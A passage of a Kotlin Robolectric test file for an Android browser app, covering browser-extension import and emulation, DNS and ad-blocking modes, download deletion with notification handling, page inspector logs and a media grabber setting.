        val indexResp = engine.interceptExtensionRequest(
            requestUrl = "https://$extHost/index.html",
            pageHost = extHost,
            isMainFrame = true,
            fallbackExtId = imported.id,
            activeTabUrl = "https://www.google.com/",
            activeTabTitle = "Google"
        )
        assertTrue(indexResp != null)
        val indexHtml = indexResp!!.data.bufferedReader().use { it.readText() }

        // CSP meta must be stripped so bootstrap scripts execute
        assertFalse(indexHtml.contains("Content-Security-Policy", ignoreCase = true))
        // Background iframe must be embedded
        assertTrue(indexHtml.contains("src=\"/__dragon_bg.html\""))
        // chrome-extension:// fetch & XHR shims + MV3 APIs present
        assertTrue(indexHtml.contains("mapExtUrl"))
        assertTrue(indexHtml.contains("XMLHttpRequest"))
        assertTrue(indexHtml.contains("getContexts:"))
        assertTrue(indexHtml.contains("webRequest:"))
        assertTrue(indexHtml.contains("MAIN_FRAME: 'main_frame'"))
        // makeEventTarget MUST be declared before storageArea uses it
        val makeEvtIdx = indexHtml.indexOf("var makeEventTarget = function")
        val storageAreaIdx = indexHtml.indexOf("var storageArea = {")
        assertTrue(makeEvtIdx > 0 && storageAreaIdx > makeEvtIdx)

        // Verify /__dragon_bg.html runner serves module script + module ready flag in order
        val bgResp = engine.interceptExtensionRequest(
            requestUrl = "https://$extHost/__dragon_bg.html",
            pageHost = extHost,
            isMainFrame = false,
            fallbackExtId = imported.id,
            activeTabUrl = "https://www.google.com/",
            activeTabTitle = "Google"
        )
        assertTrue(bgResp != null)
        assertEquals("text/html", bgResp!!.mimeType)
        val bgHtml = bgResp.data.bufferedReader().use { it.readText() }
        assertTrue(bgHtml.contains("<script type=\"module\" src=\"/bg.js\"></script>"))
        assertTrue(bgHtml.contains("<script type=\"module\">try { if (window.parent) window.parent.__dragonExtBgReady = true; } catch (e) {}</script>"))
    }

    @Test
    fun `DNS modes support WARP AdBlocker Unfiltered AdBlocker and Custom DNS`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val repo = KernelRepository.getInstance(context)
        val dm = repo.downloadManager

        // Default is SYSTEM_DEFAULT
        dm.setDnsMode(com.example.data.downloader.DnsProviderMode.SYSTEM_DEFAULT)
        assertEquals(com.example.data.downloader.DnsProviderMode.SYSTEM_DEFAULT, dm.dnsModeFlow.value)
        assertFalse(dm.warpDnsEnabledFlow.value)
        assertFalse(dm.warpDns.shouldBlockBrowserAdRequest("doubleclick.net", isMainFrame = false))
        assertFalse(dm.warpDns.shouldTunnelBrowserRequest("example.com", "GET", emptyMap()))

        // Switch to WARP DNS -> tunnels browser GET/HEAD/OPTIONS requests through active DNS resolver & enables WARP
        dm.setDnsMode(com.example.data.downloader.DnsProviderMode.CLOUDFLARE_WARP)
        assertTrue(dm.warpDnsEnabledFlow.value)
        assertTrue(dm.warpDns.isEnabled)
        assertTrue(dm.warpDnsTelemetryFlow.value.isEnabled)
        assertTrue(dm.warpDns.isAnyCustomDnsActive)
        assertTrue(dm.warpDns.shouldTunnelBrowserRequest("example.com", "GET", emptyMap()))
        assertTrue(dm.warpDns.shouldTunnelBrowserRequest("example.com", "OPTIONS", mapOf("Origin" to "https://example.com")))
        assertFalse(dm.warpDns.shouldTunnelBrowserRequest("example.com", "POST", emptyMap()))
        assertFalse(dm.warpDns.shouldTunnelBrowserRequest("example.com", "GET", mapOf("Upgrade" to "websocket")))

        // Switch to AdBlocker DNS -> WARP MUST be false while AdBlocker DNS is active!
        dm.setDnsMode(com.example.data.downloader.DnsProviderMode.ADBLOCKER_DNS)
        assertEquals(com.example.data.downloader.DnsProviderMode.ADBLOCKER_DNS, dm.dnsModeFlow.value)
        assertFalse(dm.warpDnsEnabledFlow.value)
        assertFalse(dm.warpDns.isEnabled)
        assertFalse(dm.warpDnsTelemetryFlow.value.isEnabled)
        assertTrue(dm.warpDns.isAnyCustomDnsActive)
        assertTrue(dm.warpDns.shouldBlockBrowserAdRequest("ad.doubleclick.net", "https://ad.doubleclick.net/ad.js", isMainFrame = false))
        assertTrue(dm.warpDns.shouldBlockBrowserAdRequest("popads.net", "https://popads.net/pop.js", isMainFrame = false))
        assertTrue(dm.warpDns.shouldBlockBrowserAdNavigation("https://onclickalgo.com/popunder?id=1", "example.com"))
        assertFalse(dm.warpDns.shouldBlockBrowserAdRequest("www.google.com", "https://www.google.com/", isMainFrame = true))
        assertEquals("application/javascript", dm.warpDns.buildAdBlockedWebResourceResponse("https://ad.doubleclick.net/script.js").mimeType)
        assertEquals("image/gif", dm.warpDns.buildAdBlockedWebResourceResponse("https://ad.doubleclick.net/pixel.gif").mimeType)

        // Verify cold reload with persisted ADBLOCKER_DNS does NOT activate WARP DNS
        val reloadedDm = DragonDownloadManager(
            context = context,
            scope = kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Unconfined),
            onFeedback = {}
        )
        assertEquals(com.example.data.downloader.DnsProviderMode.ADBLOCKER_DNS, reloadedDm.dnsModeFlow.value)
        assertFalse(reloadedDm.warpDnsEnabledFlow.value)
        assertFalse(reloadedDm.warpDns.isEnabled)
        assertFalse(reloadedDm.warpDnsTelemetryFlow.value.isEnabled)
        assertTrue(reloadedDm.warpDns.isAnyCustomDnsActive)

        // Switch to Unfiltered AdBlocker DNS -> WARP MUST be false while Unfiltered AdBlocker is active
        dm.setDnsMode(com.example.data.downloader.DnsProviderMode.UNFILTERED_ADBLOCKER_DNS)
        assertEquals(com.example.data.downloader.DnsProviderMode.UNFILTERED_ADBLOCKER_DNS, dm.dnsModeFlow.value)
        assertFalse(dm.warpDnsEnabledFlow.value)
        assertFalse(dm.warpDns.isEnabled)
        assertFalse(dm.warpDnsTelemetryFlow.value.isEnabled)
        assertTrue(dm.warpDns.isAnyCustomDnsActive)
        assertFalse(dm.warpDns.shouldBlockBrowserAdRequest("ad.doubleclick.net", isMainFrame = false))
        assertTrue(dm.warpDns.shouldTunnelBrowserRequest("example.org", "GET", emptyMap()))

        // Verify IPv4-to-DoH mapping for Custom DNS
        assertEquals(
            "https://dns.quad9.net/dns-query",
            com.example.data.downloader.CloudflareWarpDns.mapKnownIpv4ToDohEndpoint("9.9.9.9")
        )
        assertEquals(
            "https://dns.adguard-dns.com/dns-query",
            com.example.data.downloader.CloudflareWarpDns.mapKnownIpv4ToDohEndpoint("94.140.14.14")
        )

        // Add & activate Custom DNS -> WARP MUST be false while Custom DNS is active
        val custom = dm.addCustomDnsServer(
            name = "Quad9 Secure",
            primaryServer = "https://dns.quad9.net/dns-query",
            secondaryServer = "9.9.9.9",
            activateImmediately = true
        )
        assertTrue(custom != null)
        assertEquals(com.example.data.downloader.DnsProviderMode.CUSTOM_DNS, dm.dnsModeFlow.value)
        assertFalse(dm.warpDnsEnabledFlow.value)
        assertFalse(dm.warpDns.isEnabled)
        assertFalse(dm.warpDnsTelemetryFlow.value.isEnabled)
        assertEquals("Quad9 Secure", dm.activeCustomDnsFlow.value?.name)
        assertTrue(dm.warpDns.shouldTunnelBrowserRequest("example.org", "GET", emptyMap()))

        // Remove Custom DNS falls back cleanly
        dm.removeCustomDnsServer(custom!!.id)
        assertEquals(com.example.data.downloader.DnsProviderMode.SYSTEM_DEFAULT, dm.dnsModeFlow.value)
        assertFalse(dm.warpDnsEnabledFlow.value)
    }

    @Test
    fun `extension engine resolves actual name with placeholders and unpacks large multi-thousand-file archives in cacheDir with modification panel`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val engine = com.example.data.browser.BrowserExtensionEngine(context)

        val zipBytes = java.io.ByteArrayOutputStream().use { baos ->
            java.util.zip.ZipOutputStream(baos).use { zos ->
                fun addEntry(name: String, content: String) {
                    zos.putNextEntry(java.util.zip.ZipEntry(name))
                    zos.write(content.toByteArray(Charsets.UTF_8))
                    zos.closeEntry()
                }
                // Include UTF-8 BOM + __MSG_ext_title__ placeholder + >2100 files to verify no 2000-file storage failure
                addEntry(
                    "manifest.json",
                    "\uFEFF" + """
                    {
                      "manifest_version": 3,
                      "name": "__MSG_ext_title__",
                      "version": "2.5.0",
                      "default_locale": "en-US",
                      "content_scripts": [
                        {
                          "matches": ["<all_urls>"],
                          "js": ["content.js"]
                        }
                      ]
                    }
                    """.trimIndent()
                )
                addEntry(
                    "_locales/en_US/messages.json",
                    """
                    {
                      "ext_title": {
                        "message": "${'$'}BRAND${'$'} Shield Pro",
                        "placeholders": {
                          "brand": { "content": "uBlock" }
                        }
                      }
                    }
                    """.trimIndent()
                )
                addEntry("content.js", "console.log('active');")
                for (i in 1..2105) {
                    addEntry("assets/rule_$i.json", "{}")
                }
            }
            baos.toByteArray()
        }

        val installed = engine.importExtensionFromBytes(
            fileName = "cjpalhdlnbpafiamejdnhcphjbkeiagm.crx",
            rawBytes = zipBytes
        ).getOrThrow()

        assertEquals("uBlock Shield Pro", installed.name)
        // Stored inside cacheDir so permanent App User Data in filesDir does not bloat
        assertTrue(installed.installDirPath.contains(context.cacheDir.absolutePath))

        // Even without a bundled popup.html, loadExtensionPopupHtml synthesizes an interactive Modification Panel
        val panelPayload = engine.loadExtensionPopupHtml(installed, "https://example.com", "Example")
        assertTrue(panelPayload != null)
        assertTrue(panelPayload!!.second.contains("uBlock Shield Pro"))

        // Live modification panel updates name, match patterns, and inline JS/CSS
        val modified = engine.updateExtensionConfiguration(
            extensionId = installed.id,
            newName = "uBlock Shield Custom",
            matchPatternsRaw = "*://*.example.com/*",
            runAt = "document_start",
            customJs = "window.__customMod = true;",
            customCss = "body { background: #000 !important; }"
        )
        assertTrue(modified != null)
        assertEquals("uBlock Shield Custom", modified!!.name)
        assertEquals("document_start", modified.contentScripts.first().runAt)
        assertTrue(engine.buildInjectionPayloadForUrl("https://www.example.com/test", "document_start").contains("__customMod"))
    }

    @Test
    fun `unpacked extension folder import copies manifest locales scripts popup and skips git or map files`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val engine = com.example.data.browser.BrowserExtensionEngine(context)

        val tempParent = kotlin.io.path.createTempDirectory("dragon_unpacked_ext_test").toFile()
        try {
            // Simulate selecting a parent wrapper folder containing the actual extension subfolder + junk .git/.map files
            val unpackedSub = java.io.File(tempParent, "my-unpacked-ext").apply { mkdirs() }
            java.io.File(unpackedSub, ".git").apply { mkdirs() }
            java.io.File(unpackedSub, ".git/config").writeText("[core]")
            java.io.File(unpackedSub, "bundle.js.map").writeText("{}")
            java.io.File(unpackedSub, "_locales/en").apply { mkdirs() }
            java.io.File(unpackedSub, "_locales/en/messages.json").writeText(
                """
                {
                  "ext_name": { "message": "Unpacked Dev Enhancer" },
                  "ext_desc": { "message": "Loaded from unpacked directory" }
                }
                """.trimIndent()
            )
            java.io.File(unpackedSub, "manifest.json").writeText(
                """
                {
                  "manifest_version": 3,
                  "name": "__MSG_ext_name__",
                  "description": "__MSG_ext_desc__",
                  "version": "1.4.2",
                  "default_locale": "en",
                  "action": { "default_popup": "popup/panel.html" },
                  "content_scripts": [
                    {
                      "matches": ["*://*.example.org/*"],
                      "js": ["scripts/content.js"],
                      "css": ["styles/theme.css"],
                      "run_at": "document_start"
                    }
                  ]
                }
                """.trimIndent()
            )
            java.io.File(unpackedSub, "popup").apply { mkdirs() }
            java.io.File(unpackedSub, "popup/panel.html").writeText("<!doctype html><html><body><h3>Unpacked Panel</h3></body></html>")
            java.io.File(unpackedSub, "scripts").apply { mkdirs() }
            java.io.File(unpackedSub, "scripts/content.js").writeText("window.__unpackedActive = true;")
            java.io.File(unpackedSub, "styles").apply { mkdirs() }
            java.io.File(unpackedSub, "styles/theme.css").writeText("body { color: #111; }")

            val installed = engine.importUnpackedExtensionFromDirectory(tempParent).getOrThrow()
            assertEquals("Unpacked Dev Enhancer", installed.name)
            assertEquals("1.4.2", installed.version)
            assertEquals("popup/panel.html", installed.popupPath)
            assertTrue(installed.installDirPath.contains(context.cacheDir.absolutePath))

            val installedRoot = java.io.File(installed.installDirPath)
            assertTrue(java.io.File(installedRoot, "scripts/content.js").exists())
            assertFalse(java.io.File(installedRoot, ".git/config").exists())
            assertFalse(java.io.File(installedRoot, "bundle.js.map").exists())

            val payload = engine.buildInjectionPayloadForUrl("https://sub.example.org/home", "document_start")
            assertTrue(payload.contains("__unpackedActive"))
            assertTrue(payload.contains("body { color: #111; }"))

            // Selecting a file://.../manifest.json URI directly should import the whole unpacked folder
            val manifestUri = android.net.Uri.fromFile(java.io.File(unpackedSub, "manifest.json"))
            val fromManifestUri = engine.importExtensionFromUri(manifestUri).getOrThrow()
            assertEquals("Unpacked Dev Enhancer", fromManifestUri.name)
            assertTrue(java.io.File(fromManifestUri.installDirPath, "popup/panel.html").exists())

            // Script-only unpacked folder without manifest.json falls back cleanly using @name
            val scriptOnlyDir = java.io.File(tempParent, "script-only-folder").apply { mkdirs() }
            java.io.File(scriptOnlyDir, "helper.user.js").writeText(
                "// ==UserScript==\n// @name Loose Folder Helper\n// ==/UserScript==\nwindow.__looseHelper = 1;"
            )
            val scriptExt = engine.importUnpackedExtensionFromTreeUri(android.net.Uri.fromFile(scriptOnlyDir)).getOrThrow()
            assertEquals("Loose Folder Helper", scriptExt.name)
            assertTrue(engine.buildInjectionPayloadForUrl("https://example.com/", "document_end").contains("__looseHelper"))
        } finally {
            tempParent.deleteRecursively()
        }
    }

    @Test
    fun `deleting or removing completed file permanently removes task and suppresses notification across reloads`() {
        val app = ApplicationProvider.getApplicationContext<android.app.Application>()
        org.robolectric.Shadows.shadowOf(app).grantPermissions(android.Manifest.permission.POST_NOTIFICATIONS)
        val notifManager = app.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
        val shadowNotifManager = org.robolectric.Shadows.shadowOf(notifManager)

        val ddmPrefs = app.getSharedPreferences("dragon_universal_downloader", Context.MODE_PRIVATE)
        val notifPrefs = app.getSharedPreferences("dragon_download_notif_prefs", Context.MODE_PRIVATE)
        ddmPrefs.edit().clear().commit()
        notifPrefs.edit().clear().commit()

        val exportDir = java.io.File(app.cacheDir, "ddm_exports/DDM/Video").apply { mkdirs() }
        val file1 = java.io.File(exportDir, "completed_video_one.mp4").apply { writeText("video-one-bytes") }
        val file2 = java.io.File(exportDir, "completed_video_two.mp4").apply { writeText("video-two-bytes") }
        val file3 = java.io.File(exportDir, "completed_video_three.mp4").apply { writeText("video-three-bytes") }

        // Register a test MediaStore ContentProvider for authority "media" so query + openAssetFileDescriptor behave like real Android
        val mediaStoreFiles = linkedMapOf(
            "content://media/external/downloads/99001" to file1
        )
        val mediaProvider = object : android.content.ContentProvider() {
            override fun onCreate(): Boolean = true
            override fun query(
                uri: android.net.Uri,
                projection: Array<out String>?,
                selection: String?,
                selectionArgs: Array<out String>?,
                sortOrder: String?
            ): android.database.Cursor {
                val cursor = android.database.MatrixCursor(arrayOf("_id", "is_trashed"))
                val targetFile = mediaStoreFiles[uri.toString()]
                if (targetFile != null && targetFile.exists()) {
                    cursor.addRow(arrayOf(99001L, 0))
                }
                return cursor
            }

            override fun openAssetFile(uri: android.net.Uri, mode: String): android.content.res.AssetFileDescriptor? {
                val targetFile = mediaStoreFiles[uri.toString()]
                    ?.takeIf { it.exists() }
                    ?: throw java.io.FileNotFoundException("Missing media item: $uri")
                val pfd = android.os.ParcelFileDescriptor.open(
                    targetFile,
                    android.os.ParcelFileDescriptor.MODE_READ_ONLY
                )
                return android.content.res.AssetFileDescriptor(pfd, 0L, targetFile.length())
            }

            override fun getType(uri: android.net.Uri): String = "video/mp4"
            override fun insert(uri: android.net.Uri, values: android.content.ContentValues?): android.net.Uri? = null
            override fun delete(uri: android.net.Uri, selection: String?, selectionArgs: Array<out String>?): Int = 0
            override fun update(
                uri: android.net.Uri,
                values: android.content.ContentValues?,
                selection: String?,
                selectionArgs: Array<out String>?
            ): Int = 0
        }
        val providerInfo = android.content.pm.ProviderInfo().apply {
            authority = "media"
        }
        mediaProvider.attachInfo(app, providerInfo)
        org.robolectric.shadows.ShadowContentResolver.registerProviderInternal("media", mediaProvider)

        try {
            val savedJson = org.json.JSONArray().apply {
                put(
                    org.json.JSONObject().apply {
                        put("id", "completed_task_1")
                        put("url", "https://example.com/1.mp4")
                        put("title", "Completed One")
                        put("filename", "completed_video_one.mp4")
                        put("stage", com.example.data.model.DownloadStateStage.COMPLETED.name)
                        put("progress", 1.0)
                        put("downloadedBytes", file1.length())
                        put("totalBytes", file1.length())
                        put("filePath", file1.absolutePath)
                        put("publicUriString", "content://media/external/downloads/99001")
                        put("createdAtMs", 1000L)
                    }
                )
                put(
                    org.json.JSONObject().apply {
                        put("id", "completed_task_2")
                        put("url", "https://example.com/2.mp4")
                        put("title", "Completed Two")
                        put("filename", "completed_video_two.mp4")
                        put("stage", com.example.data.model.DownloadStateStage.COMPLETED.name)
                        put("progress", 1.0)
                        put("downloadedBytes", file2.length())
                        put("totalBytes", file2.length())
                        put("filePath", file2.absolutePath)
                        put("createdAtMs", 2000L)
                    }
                )
            }
            ddmPrefs.edit().putString("saved_tasks_v2", savedJson.toString()).commit()

            val scope = kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Unconfined)
            val dm1 = DragonDownloadManager(context = app, scope = scope, onFeedback = {})
            dm1.ensurePersistedTasksLoaded()
            assertEquals(2, dm1.tasksFlow.value.size)

            // Simulate active notification shown for completed download
            dm1.notificationController.onNewDownloadStarted("completed_task_2")
            dm1.notificationController.syncTasks(dm1.tasksFlow.value, force = true)
            assertTrue(dm1.notificationController.isPanelVisibleFlow.value)
            assertTrue(
                shadowNotifManager.getNotification(
                    com.example.data.downloader.DownloadNotificationController.NOTIFICATION_ID_DOWNLOAD_PANEL
                ) != null
            )

            // 1. User deletes completed_task_2 from the Downloaded/Completed section inside app
            dm1.cancelDownload("completed_task_2")
            assertEquals(listOf("completed_task_1"), dm1.tasksFlow.value.map { it.id })
            assertFalse(file2.exists())
            assertFalse(dm1.notificationController.isPanelVisibleFlow.value)
            assertEquals(
                null,
                shadowNotifManager.getNotification(
                    com.example.data.downloader.DownloadNotificationController.NOTIFICATION_ID_DOWNLOAD_PANEL
                )
            )

            // 2. Cold restart / onResume must NOT bring back deleted completed_task_2 or re-show completed notification
            val dm2 = DragonDownloadManager(context = app, scope = scope, onFeedback = {})
            dm2.ensurePersistedTasksLoaded()
            dm2.pruneDeletedCompletedTasks()
            dm2.notificationController.syncTasks(dm2.tasksFlow.value, force = false)
            assertEquals(listOf("completed_task_1"), dm2.tasksFlow.value.map { it.id })
            assertFalse(dm2.notificationController.isPanelVisibleFlow.value)
            assertEquals(
                null,
                shadowNotifManager.getNotification(
                    com.example.data.downloader.DownloadNotificationController.NOTIFICATION_ID_DOWNLOAD_PANEL
                )
            )

            // 3. External deletion (e.g. deleted from system Downloads/Files app): remove from MediaStore + delete file1
            mediaStoreFiles.remove("content://media/external/downloads/99001")
            assertTrue(file1.delete())
            dm2.pruneDeletedCompletedTasks()
            dm2.notificationController.syncTasks(dm2.tasksFlow.value, force = false)
            assertTrue(dm2.tasksFlow.value.isEmpty())
            assertFalse(dm2.notificationController.isPanelVisibleFlow.value)
            assertEquals(
                null,
                shadowNotifManager.getNotification(
                    com.example.data.downloader.DownloadNotificationController.NOTIFICATION_ID_DOWNLOAD_PANEL
                )
            )

            // Another cold restart confirms pruned completed_task_1 & notification never come back
            val dm3 = DragonDownloadManager(context = app, scope = scope, onFeedback = {})
            dm3.ensurePersistedTasksLoaded()
            dm3.pruneDeletedCompletedTasks()
            dm3.notificationController.syncTasks(dm3.tasksFlow.value, force = false)
            assertTrue(dm3.tasksFlow.value.isEmpty())
            assertFalse(dm3.notificationController.isPanelVisibleFlow.value)
            assertEquals(
                null,
                shadowNotifManager.getNotification(
                    com.example.data.downloader.DownloadNotificationController.NOTIFICATION_ID_DOWNLOAD_PANEL
                )
            )

            // 4. Dismissing a completed notification via receiver/panel dismiss persists across reload,
            //    while starting a new download re-enables the notification panel properly.
            val newCompletedJson = org.json.JSONArray().apply {
                put(
                    org.json.JSONObject().apply {
                        put("id", "completed_task_3")
                        put("url", "https://example.com/3.mp4")
                        put("title", "Completed Three")
                        put("filename", "completed_video_three.mp4")
                        put("stage", com.example.data.model.DownloadStateStage.COMPLETED.name)
                        put("progress", 1.0)
                        put("downloadedBytes", file3.length())
                        put("totalBytes", file3.length())
                        put("filePath", file3.absolutePath)
                        put("createdAtMs", 3000L)
                    }
                )
            }
            ddmPrefs.edit().putString("saved_tasks_v2", newCompletedJson.toString()).commit()
            val dm4 = DragonDownloadManager(context = app, scope = scope, onFeedback = {})
            dm4.ensurePersistedTasksLoaded()
            assertEquals(listOf("completed_task_3"), dm4.tasksFlow.value.map { it.id })
            dm4.notificationController.onNewDownloadStarted("completed_task_3")
            dm4.notificationController.syncTasks(dm4.tasksFlow.value, force = true)
            assertTrue(dm4.notificationController.isPanelVisibleFlow.value)

            dm4.dismissNotificationPanel("completed_task_3")
            assertFalse(dm4.notificationController.isPanelVisibleFlow.value)

            val dm5 = DragonDownloadManager(context = app, scope = scope, onFeedback = {})
            dm5.ensurePersistedTasksLoaded()
            dm5.notificationController.syncTasks(dm5.tasksFlow.value, force = false)
            assertFalse(dm5.notificationController.isPanelVisibleFlow.value)
            assertEquals(
                null,
                shadowNotifManager.getNotification(
                    com.example.data.downloader.DownloadNotificationController.NOTIFICATION_ID_DOWNLOAD_PANEL
                )
            )
        } finally {
            exportDir.deleteRecursively()
        }
    }

    @Test
    fun `extension info metadata options page virtual scheme and persistence work properly`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val engine = com.example.data.browser.BrowserExtensionEngine(context)

        val zipBytes = java.io.ByteArrayOutputStream().use { baos ->
            java.util.zip.ZipOutputStream(baos).use { zos ->
                fun addEntry(name: String, content: String) {
                    zos.putNextEntry(java.util.zip.ZipEntry(name))
                    zos.write(content.toByteArray(Charsets.UTF_8))
                    zos.closeEntry()
                }
                addEntry(
                    "manifest.json",
                    """
                    {
                      "manifest_version": 3,
                      "name": "Dark Reader Dev",
                      "version": "4.9.1",
                      "author": "Dragon Dev Team",
                      "homepage_url": "https://example.org/dark-reader",
                      "description": "Custom dark theme & site settings",
                      "permissions": ["storage", "tabs", "scripting"],
                      "host_permissions": ["<all_urls>"],
                      "action": { "default_popup": "popup.html" },
                      "options_ui": { "page": "options/settings.html", "open_in_tab": true }
                    }
                    """.trimIndent()
                )
                addEntry("popup.html", "<!doctype html><html><body><h1>Popup</h1></body></html>")
                addEntry("options/settings.html", "<!doctype html><html><body><h2>Extension Settings Page</h2><input id='theme' value='dark'/></body></html>")
                addEntry("options/settings.js", "console.log('settings loaded');")
            }
            baos.toByteArray()
        }

        val installed = engine.importExtensionFromBytes(
            fileName = "dark_reader_dev.zip",
            rawBytes = zipBytes
        ).getOrThrow()

        assertEquals("options/settings.html", installed.optionsPath)
        assertTrue(installed.optionsOpenInTab)
        assertEquals("Dragon Dev Team", installed.author)
        assertEquals("https://example.org/dark-reader", installed.homepageUrl)

        // Verify persistence across cold engine reload
        val reloaded = com.example.data.browser.BrowserExtensionEngine(context)
        val persisted = reloaded.extensionsFlow.value.find { it.id == installed.id }
        assertTrue(persisted != null)
        assertEquals("options/settings.html", persisted!!.optionsPath)
        assertTrue(persisted.optionsOpenInTab)
        assertEquals("Dragon Dev Team", persisted.author)
        assertEquals("https://example.org/dark-reader", persisted.homepageUrl)

        // Verify loading options/settings page via targetPagePath
        val settingsPayload = reloaded.loadExtensionPopupHtml(
            ext = persisted,
            activeTabUrl = "https://example.com/",
            activeTabTitle = "Example",
            targetPagePath = persisted.optionsPath
        )
        assertTrue(settingsPayload != null)
        assertTrue(settingsPayload!!.first.endsWith("/options/settings.html"))
        assertTrue(settingsPayload.second.contains("Extension Settings Page"))
        assertTrue(settingsPayload.second.contains("storage:") && settingsPayload.second.contains("__dragonCreateExtensionScope"))

        // Verify manifest.json pretty reader & disk stats
        val manifestPretty = reloaded.readExtensionManifestPrettyJson(persisted)
        assertTrue(manifestPretty != null && manifestPretty.contains("\"options_ui\""))
        val (fileCount, totalBytes) = reloaded.computeExtensionDiskStats(persisted)
        assertEquals(4, fileCount)
        assertTrue(totalBytes > 100L)

        // Verify chrome-extension:// and moz-extension:// URL translation
        val translatedChrome = reloaded.translateExtensionSchemeToVirtualUrl(
            "chrome-extension://${persisted.id}/options/settings.html?tab=general"
        )
        assertTrue(translatedChrome != null && translatedChrome.contains("/options/settings.html?tab=general"))
        val translatedMoz = reloaded.translateExtensionSchemeToVirtualUrl(
            "moz-extension://${persisted.id}/popup.html"
        )
        assertTrue(translatedMoz != null && translatedMoz.endsWith("/popup.html"))
    }

    @Test
    fun `page inspector console network telemetry and snapshot json parsing work accurately`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val repo = com.example.data.browser.BrowserStateRepository(context)
        assertFalse(repo.pageInspectorEnabledFlow.value)
        repo.setPageInspectorEnabled(true)
        val tab1 = repo.getActiveTab()
        val tab2 = repo.openNewTab("https://example.org")

        // Verify Console & Network telemetry recording, cap limits, and clearing
        repeat(160) { i ->
            repo.recordConsoleMessage(tab1.id, if (i % 10 == 0) "ERROR" else "LOG", "msg #$i", "app.js", i + 1)
        }
        assertEquals(150, repo.consoleLogsByTabFlow.value[tab1.id]?.size)
        assertEquals("msg #159", repo.consoleLogsByTabFlow.value[tab1.id]?.last()?.message)

        repeat(210) { i ->
            repo.recordNetworkRequest(
                tabId = tab1.id,
                url = "https://cdn.example.org/asset_$i.js",
                method = "GET",
                resourceType = "Script",
                statusLabel = if (i % 5 == 0) "AdBlocked" else "Allowed"
            )
        }
        assertEquals(200, repo.networkLogsByTabFlow.value[tab1.id]?.size)
        assertEquals("cdn.example.org", repo.networkLogsByTabFlow.value[tab1.id]?.last()?.domain)

        // Clearing & Closing tabs cleans up inspector buffers
        repo.recordConsoleMessage(tab2.id, "WARN", "tab2 warning", "main.js", 12)
        repo.recordNetworkRequest(tab2.id, "https://example.org/", "GET", "Document", "DNS Tunnel")
        repo.closeTab(tab2.id)
        assertEquals(null, repo.consoleLogsByTabFlow.value[tab2.id])
        assertEquals(null, repo.networkLogsByTabFlow.value[tab2.id])

        repo.clearConsoleLogs(tab1.id)
        repo.clearNetworkLogs(tab1.id)
        assertEquals(null, repo.consoleLogsByTabFlow.value[tab1.id])
        assertEquals(null, repo.networkLogsByTabFlow.value[tab1.id])

        // Verify snapshot JSON parser handles rich DOM + perf + selected element payload
        val sampleJson = org.json.JSONObject().apply {
            put("url", "https://example.com/article")
            put("title", "Inspector Demo")
            put("domain", "example.com")
            put("protocol", "https")
            put("readyState", "complete")
            put("compatMode", "CSS1Compat")
            put("charset", "UTF-8")
            put("viewportLabel", "412×915 @2.63x")
            put("dnsMs", 14L)
            put("tcpMs", 28L)
            put("ttfbMs", 62L)
            put("domInteractiveMs", 145L)
            put("totalLoadMs", 310L)
            put("totalElements", 128)
            put("scriptCount", 6)
            put("stylesheetCount", 3)
            put("imageCount", 12)
            put("linkCount", 24)
            put("formCount", 1)
            put("iframeCount", 0)
            put("totalHtmlLength", 8420)
            put("htmlSourcePreview", "<html><body><h1>Inspector Demo</h1></body></html>")
            put("domNodes", org.json.JSONArray().apply {
                put(org.json.JSONObject().apply {
                    put("tag", "h1")
                    put("idAttr", "hero-title")
                    put("classAttr", "title main")
                    put("selector", "#hero-title")
                    put("textSnippet", "Inspector Demo")
                    put("attrsSummary", "data-role=\"heading\"")
                    put("depth", 2)
                    put("childCount", 0)
                    put("rectLabel", "320x44")
                })
            })
            put("selectedElement", org.json.JSONObject().apply {
                put("tag", "h1")
                put("idAttr", "hero-title")
                put("classAttr", "title main")
                put("selector", "#hero-title")
                put("rectLabel", "320×44 @ (16,120)")
                put("textContent", "Inspector Demo")
                put("outerHtmlPreview", "<h1 id=\"hero-title\" class=\"title main\">Inspector Demo</h1>")
                put("attributes", org.json.JSONArray().put(org.json.JSONObject().put("k", "id").put("v", "hero-title")))
                put("computedStyles", org.json.JSONArray().put(org.json.JSONObject().put("k", "fontSize").put("v", "28px")))
            })
        }.toString()

        val parsed = com.example.ui.screens.parseInspectorSnapshotJson(sampleJson)
        assertEquals("Inspector Demo", parsed.title)
        assertEquals("example.com", parsed.domain)
        assertEquals(62L, parsed.ttfbMs)
        assertEquals(128, parsed.totalElements)
        assertEquals(1, parsed.domNodes.size)
        assertEquals("#hero-title", parsed.selectedElement?.selector)
        assertEquals("28px", parsed.selectedElement?.computedStyles?.firstOrNull()?.second)
    }

    @Test
    fun `media grabber toggle gates capture clears active hits and persists across reload`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val repo = com.example.data.browser.BrowserStateRepository(context)
        val tab = repo.getActiveTab()

        // Default is enabled
        assertTrue(repo.mediaGrabberEnabledFlow.value)

        val videoHit = com.example.data.browser.GrabbedMediaCandidate(
            url = "https://cdn.example.com/movie_1080p.mp4",
            title = "Sample Movie",
            kind = com.example.data.browser.GrabbedMediaKind.VIDEO,
            containerExt = "mp4",
            sourceLabel = "Video Player"
        )
        repo.recordGrabbedMedia(tab.id, videoHit)
        assertEquals(1, repo.grabbedMediaByTabFlow.value[tab.id]?.size)

        // Turning OFF clears existing grabbed hits and blocks subsequent captures
        repo.setMediaGrabberEnabled(false)
        assertFalse(repo.mediaGrabberEnabledFlow.value)
        assertTrue(repo.grabbedMediaByTabFlow.value.isEmpty())

        repo.recordGrabbedMedia(
            tab.id,
            videoHit.copy(url = "https://cdn.example.com/stream.m3u8", containerExt = "m3u8")
        )
        assertTrue(repo.grabbedMediaByTabFlow.value[tab.id].isNullOrEmpty())

        // Persisted OFF across reload
        val reloaded = com.example.data.browser.BrowserStateRepository(context)
        assertFalse(reloaded.mediaGrabberEnabledFlow.value)

        // Turning back ON allows capture again
        reloaded.setMediaGrabberEnabled(true)
        assertTrue(reloaded.mediaGrabberEnabledFlow.value)
        reloaded.recordGrabbedMedia(reloaded.getActiveTab().id, videoHit)
